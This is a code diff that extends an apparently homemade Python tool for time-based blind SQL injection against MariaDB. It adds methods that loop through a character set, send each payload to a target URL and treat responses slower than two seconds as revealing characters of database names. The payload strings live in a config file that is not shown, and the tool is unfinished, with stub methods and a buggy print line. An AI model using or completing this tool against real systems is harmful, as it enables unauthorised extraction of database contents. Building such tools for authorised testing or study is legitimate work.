@@ -57,6 +57,7 @@ class HTTPrequest():
         self.payload_parts = self._url_encode_path()
         self.payload_parts = self._url_encode_params()
         self.payload_parts = self._url_encode_query()
+        print(self.payload_parts.query)
         return self.payload_parts.geturl()
 
     def _parse_url(self, payload):
@@ -84,6 +85,9 @@ class BaseInjection(HTTPrequest):
 
     def __init__(self, url, header, data=None):
         super().__init__(url, header, data)
+        self.CHAR_SET = config.Characters.ALL_CHARS.value
+        self.payload = None
+        self.database_name_chars = None
 
     def get_version(self):
         pass
@@ -101,8 +105,9 @@ class BaseInjection(HTTPrequest):
             if(self.total_time > 1):
                 print('Number of databases found = ',i , ', with a response time of ', self.total_time)
 
-    def get_databases(self):
-        pass
+    def get_databases(self, query):
+        self.payload = self.url + query
+        self._find_chars_used()
 
     def get_table_names(self):
         pass
@@ -110,6 +115,16 @@ class BaseInjection(HTTPrequest):
     def get_table_columns(self):
         pass
 
+    def _find_chars_used(self):
+        """ Iterate over legal characters to find a subset that is used. """
+        for char in self.CHAR_SET:
+            print(self.payload.format(char))
+            self.time_start = time.time()
+            self.res = self.send_request(self.payload.format(char))
+            self.time_finish = time.time()
+            self.total_time = self.time_finish - self.time_start
+            if(self.total_time > 2):
+                print('Character found: ', + char)
 
 ###### MySQL ######
 
@@ -128,6 +143,9 @@ class MariaDB(BaseInjection):
     def get_database_num(self):
         super().get_database_num(config.MariaDB.DATABASE_NUM.value)
 
+    def get_databases(self):
+        super().get_databases(config.MariaDB.DATABASE_NAME_CHAR.value)
+
 ###### Command line parser ######
 parser = argparse.ArgumentParser()
 
@@ -140,6 +158,7 @@ def main():
     args = parser.parse_args()
     test_obj = MariaDB(url=args.url, header=args.header)
     test_obj.get_database_num()
+    test_obj.get_databases()
 
 if __name__ == "__main__":
     main()
